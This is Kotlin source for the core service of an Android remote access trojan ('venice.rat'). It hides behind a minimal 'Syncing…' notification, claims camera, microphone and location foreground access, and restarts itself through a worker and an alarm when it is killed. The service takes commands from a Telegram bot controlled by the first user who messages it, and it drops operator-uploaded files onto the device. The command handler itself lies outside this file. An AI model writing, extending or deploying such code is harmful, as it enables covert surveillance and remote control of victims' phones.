package com.venice.rat.core

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import org.json.JSONObject

class BotService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    @Volatile private var alive = true

    companion object {
        const val CH = "svc"
        const val ID = 1101
        fun start(ctx: Context) {
            val i = Intent(ctx, BotService::class.java)
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i) else ctx.startService(i)
        }
        fun stop(ctx: Context) { ctx.stopService(Intent(ctx, BotService::class.java)) }
    }

    override fun onBind(i: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        notif()
        ResurrectWorker.schedule(this)
        scope.launch { loop() }
    }

    override fun onStartCommand(i: Intent?, f: Int, id: Int): Int {
        alive = true
        return START_STICKY
    }

    private fun notif() {
        if (Build.VERSION.SDK_INT >= 26) {
            val m = getSystemService(NotificationManager::class.java)
            m.createNotificationChannel(
                NotificationChannel(CH, Cfg.LABEL, NotificationManager.IMPORTANCE_MIN).apply {
                    setShowBadge(false)
                    enableLights(false)
                    enableVibration(false)
                })
        }
        val p = NotificationCompat.Builder(this, CH)
            .setContentTitle(Cfg.LABEL)
            .setContentText("Syncing…")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(ID, p,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
        } else startForeground(ID, p)
    }

    private suspend fun loop() {
        while (alive) {
            try {
                val arr = Tg.updates(Prefs.offset(this))
                if (arr == null) { delay(4000); continue }
                for (i in 0 until arr.length()) {
                    val u = arr.optJSONObject(i) ?: continue
                    Prefs.setOffset(this, u.optLong("update_id") + 1)
                    route(u)
                }
                if (arr.length() == 0) delay(1200)
            } catch (e: CancellationException) {
                throw e
            } catch (e: Exception) {
                delay(5000)
            }
        }
    }

    private fun route(u: JSONObject) {
        val cb = u.optJSONObject("callback_query")
        if (cb != null) {
            val from = cb.optJSONObject("from")?.optLong("id") ?: 0
            if (Prefs.owner(this) != 0L && from != Prefs.owner(this)) return
            val msg = cb.optJSONObject("message")
            scope.launch {
                Bot.onCb(this@BotService, msg?.optJSONObject("chat")?.optLong("id") ?: 0,
                    msg?.optLong("message_id") ?: 0, cb.optString("data"), cb.optString("id"))
            }
            return
        }
        val m = u.optJSONObject("message") ?: return
        val chat = m.optJSONObject("chat")?.optLong("id") ?: return
        val from = m.optJSONObject("from")?.optLong("id") ?: chat

        if (Prefs.owner(this) == 0L) Prefs.setOwner(this, from)
        if (Prefs.owner(this) != from) return

        val doc = m.optJSONObject("document")
        if (doc != null) {
            scope.launch {
                val name = doc.optString("file_name").ifBlank { "up_${System.currentTimeMillis()}" }
                val out = java.io.File(U.dir(this@BotService, "up"), name)
                if (dl(doc.optString("file_id"), out)) Tg.send(chat, "saved: ${U.esc(out.absolutePath)}")
                else Tg.send(chat, "upload fail")
            }
            return
        }

        val text = m.optString("text")
        if (text.isBlank()) return
        scope.launch { Bot.handle(this@BotService, chat, text, m.optLong("message_id")) }
    }

    private suspend fun dl(fileId: String, out: java.io.File): Boolean = withContext(Dispatchers.IO) {
        runCatching {
            val r = Tg.j("getFile", "file_id" to fileId) ?: return@withContext false
            val path = r.optJSONObject("result")?.optString("file_path") ?: return@withContext false
            val url = "https://api.telegram.org/file/bot${Cfg.BOT_TOKEN}/$path"
            okhttp3.OkHttpClient().newCall(okhttp3.Request.Builder().url(url).build())
                .execute().use { resp ->
                    if (!resp.isSuccessful) return@withContext false
                    resp.body!!.byteStream().use { i -> out.outputStream().use { o -> i.copyTo(o) } }
                }
            true
        }.getOrDefault(false)
    }

    override fun onDestroy() {
        alive = false
        scope.cancel()
        AlarmReceiver.set(this, 60_000)
        super.onDestroy()
    }
}
